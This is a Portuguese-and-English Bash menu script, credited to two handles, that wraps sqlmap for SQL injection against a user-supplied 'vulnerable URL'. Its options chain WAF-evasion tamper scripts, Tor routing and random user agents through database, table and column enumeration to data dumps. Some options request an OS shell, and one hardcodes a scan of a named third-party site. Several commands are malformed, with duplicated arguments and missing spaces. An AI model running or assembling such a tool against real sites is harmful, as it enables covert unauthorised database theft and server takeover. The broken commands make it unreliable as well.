#!/bin/bash
x="teste"
trap 'echo "\n";stop' 2
menu ()
{
while true $x != "teste"
do
clear
echo "================================================"
echo "Criado por: Drakul0g"
echo "Tool Powered By @Who4reyou and Drakul0g"
echo "Gerador Versão Beta"
echo "Bypass Waf SQL Injection"                                                    
echo "By @Who4reyou and Drakul0g"
echo "OUTPUT /root/.sqlmap/output"
echo ""
echo "1)Injeção normal"
echo""
echo "2)Injeção com parametros normais"
echo ""
echo "3)–%0A"
echo ""
echo "4)blind SQL injection"
echo""
echo "5)identify-waf"
echo""
echo "6)erro de sintaxe"
echo""
echo "7)modsecurity"
echo ""
echo "8)charencode"
echo""
echo "9)mssql"
echo ""
echo "10)bluecoat"
echo ""
echo "11)apostrophemask"
echo""
echo "12)base64encode"
echo""
echo "13)--tor --tor-type=SOCKS5"
echo""
echo "14)Wizard mode"
echo ""
echo "15)General MSSQL"
echo ""
echo "16)General Tamper testing"
echo""
echo "17)AudiT SQLmap"
echo ""
echo "18)Sair"
echo "================================================"

echo "Digite a opção desejada:"
read x
echo "Opção informada ($x)"
echo "================================================"

case "$x" in


    1)
      echo "Informe a URL com vulnerabilidade"
      read site
      cd sqlmap
      sqlmap -u $site --dbs
      echo "Enter the name of the database you got from sqlmap"
      read db
      sqlmap -u $site -D $db --tables
      echo "enter the table to view its columns"
      read tb
      sqlmap -u $site -D $db -T $tb --columns
      echo "Enter the column to dump data use , (comma) for multiple columns :"
      read col
      sqlmap -u $site -D $db -T $tb -C $col --dump 

      
echo "================================================"
;;
    2)
      echo "Informe a URL com vulnerabilidade"
      read site
      cd sqlmap
      sqlmap -u "$site" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
echo "Enter the name of the database you got from sqlmap"
            read db
            sqlmap -u "$site" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 -D $db --tables
            echo "enter the table to view its columns"
            read tb
            sqlmap -u "$site" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            sqlmap -u "$site" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 -D $db -T $tb -C $col --dump 


     
echo "================================================"
;;
   3)
      echo "Informe a URL com vulnerabilidade"
       read site
            cd sqlmap
            sqlmap -u "$site" --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            sqlmap -u "$site" --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" -D $db --tables
            echo "enter the table to view its columns"
            read tb
            sqlmap -u "$site" --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            sqlmap -u "$site" --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" -D $db -T $tb -C $col --dump 
echo "================================================"
;;
    4)
       echo "Informe a URL com vulnerabilidade"
       read site
            cd sqlmap
            sqlmap -u "$site" -v3 --technique=T --no-cast --fresh-queries --banner --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            sqlmap -u "$site" -v3 --technique=T --no-cast --fresh-queries --banner -D $db --tables
            echo "enter the table to view its columns"
            read tb
            sqlmap -u "$site" -v3 --technique=T --no-cast --fresh-queries --banner -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            sqlmap -u "$site" -v3 --technique=T --no-cast --fresh-queries --banner -D $db -T $tb -C $col --dump 
            
echo "================================================"
;;
     5)
       echo "Informe a URL com vulnerabilidade"
            read site
            cd sqlmap
            sqlmap -u "$site" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            sqlmap -u "$site" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" -D $db --tables
            echo "enter the table to view its columns"
            read tb
            sqlmap -u "$site" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            sqlmap -u "$site" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" -D $db -T $tb -C $col --dump 
echo "================================================"
;;
    6)
    echo "Informe a URL com vulnerabilidade"
   read site
            cd sqlmap
            sqlmap -u "$site" --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3 --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            sqlmap -u "$site" --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3 -D $db --tables
            echo "enter the table to view its columns"
            read tb
            sqlmap -u "$site" --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3 -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            sqlmap -u "$site" --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3 -D $db -T $tb -C $col --dump 

echo "================================================"
 ;;
    7)
      echo "Informe a URL com vulnerabilidade"
     read site
            cd sqlmap
            sqlmap -u "$site" --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            sqlmap -u "$site" --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent -D $db --tables
            echo "enter the table to view its columns"
            read tb
            sqlmap -u "$site" --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            sqlmap -u "$site" --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent -D $db -T $tb -C $col --dump 

     
echo "================================================"
;;
   8)
      echo "Informe a URL com vulnerabilidade"
 read site
            cd sqlmap
            sqlmap -u "$site" --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2 --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            sqlmap -u "$site" --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2 -D $db --tables
            echo "enter the table to view its columns"
            read tb
            sqlmap -u "$site" --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2 -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            sqlmap -u "$site" --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2 -D $db -T $tb -C $col --dump 
echo "================================================"
;;
    9)
       echo "Informe a URL com vulnerabilidade"
       read site
            cd sqlmap
            sqlmap -u "$site" --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            sqlmap -u "$site" --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db --tables
            echo "enter the table to view its columns"
            read tb
            sqlmap -u "$site" --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            sqlmap -u "$site" --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db -T $tb -C $col --dump 
  
echo "================================================"
;;
     10)
       echo "Informe a URL com vulnerabilidade"
           read site
            cd sqlmap
            sqlmap -u "$site" --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            sqlmap -u "$site" --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql -D $db --tables
            echo "enter the table to view its columns"
            read tb
            sqlmap -u "$site" --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            sqlmap -u "$site" --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql -D $db -T $tb -C $col --dump 

echo "================================================"
;;
    11)
    echo "Informe a URL com vulnerabilidade"
    read site
            cd sqlmap
            sqlmap -u "$site" --level 5 --risk 3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            sqlmap -u "$site" --level 5 --risk 3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db --tables
            echo "enter the table to view its columns"
            read tb
            sqlmap -u "$site" --level 5 --risk 3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            sqlmap -u "$site" --level 5 --risk 3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db -T $tb -C $col --dump 

echo "================================================"
;;
    12)
      echo "Informe a URL com vulnerabilidade"
      read site
            cd sqlmap
            sqlmap -u "$site" --level=5 --risk=3 -p "id" –-tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords" --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            sqlmap -u "$site" --level=5 --risk=3 -p "id" –-tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords" -D $db --tables
            echo "enter the table to view its columns"
            read tb
            sqlmap -u "$site" --level=5 --risk=3 -p "id" –-tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords" -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            sqlmap -u "$site" --level=5 --risk=3 -p "id" –-tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords" -D $db -T $tb -C $col --dump 
     
echo "================================================"
;;
   13)
      echo "Informe a URL com vulnerabilidade"
 read site
            cd sqlmap
            sqlmap -u "$site" --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            sqlmap -u "$site" --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D $db --tables
            echo "enter the table to view its columns"
            read tb
            sqlmap -u "$site" --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            sqlmap -u "$site" --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D $db -T $tb -C $col --dump 
echo "================================================"
;;
    14)
       echo "Informe a URL com vulnerabilidade"
       read site
            cd sqlmap
            sqlmap --wizard
            
echo "================================================"
;;
     15)
       echo "Informe a URL com vulnerabilidade"
       read site
            cd sqlmap
            sqlmap -u "$site" sqlmap -u $site--level=3 --risk=3 --random-agent --os-shell --batch --flush-session --wizard --data --hex --crawl=2 --threads 10 --batch tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            sqlmap -u $site--level=3 --risk=3 --random-agent --os-shell --batch --flush-session --wizard --data --hex --crawl=2 --threads 10 --batch tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db --tables
            echo "enter the table to view its columns"
            read tb
            sqlmap -u $site--level=3 --risk=3 --random-agent --os-shell --batch --flush-session --wizard --data --hex --crawl=2 --threads 10 --batch tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            sqlmap -u $site--level=3 --risk=3 --random-agent --os-shell --batch --flush-session --wizard --data --hex --crawl=2 --threads 10 --batch tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db -T $tb -C $col --dump 
echo "================================================"
;;
    16)
    read site
            cd sqlmap
            sqlmap -u "$site" sqlmap -u $site--level=3 --risk=3 --random-agent --os-shell --batch --flush-session --wizard --data --hex --crawl=2 --threads 10 --batch tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbs
            echo "Enter the name of the database you got from sqlmap"
            read db
            sqlmap -u "$site" sqlmap -u $site--level=3 --risk=3 --random-agent --os-shell --batch --flush-session --wizard --data --hex --crawl=2 --threads 10 --batch tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes -D $db --tables
            echo "enter the table to view its columns"
            read tb
            sqlmap -u "$site" sqlmap -u $site--level=3 --risk=3 --random-agent --os-shell --batch --flush-session --wizard --data --hex --crawl=2 --threads 10 --batch tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes -D $db -T $tb --columns
            echo "Enter the column to dump data use , (comma) for multiple columns :"
            read col
            sqlmap -u "$site" sqlmap -u $site--level=3 --risk=3 --random-agent --os-shell --batch --flush-session --wizard --data --hex --crawl=2 --threads 10 --batch tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes -D $db -T $tb -C $col --dump 

echo "================================================"
 ;;
    17)
      echo "Informe uma URL"
     read site
            sqlmap -v 2 --url=http://ongrace.com/portal/ --user-agent=SQLMAP --delay=1 --timeout=15 --retries=2 --keep-alive --threads=10 --batch --dbms=MySQL --os=Linux --level=5 --risk=3 --banner --is-dba --dbs --tables --technique=BEUST -s /tmp/scan_report.txt --flush-session -t /tmp/scan_trace.txt --fresh-queries

   
echo "================================================"
;;
       18)
         echo "saindo..."
         sleep 5
         clear;
         exit;
echo "================================================"
;;

*)
        echo "Opção inválida!"
esac
sleep 60
done

}
menu

echo "\e[1;92m[*] ~~~~~~~~ ~~~~~~~~ echon\n"
     echo "\e[1;92m[*] Thanks For Use The Tool!echon"
echo "\e[1;92m[*] Feedback --> @who4reyou (Telegram Group)\e[0mecho"

echo " "




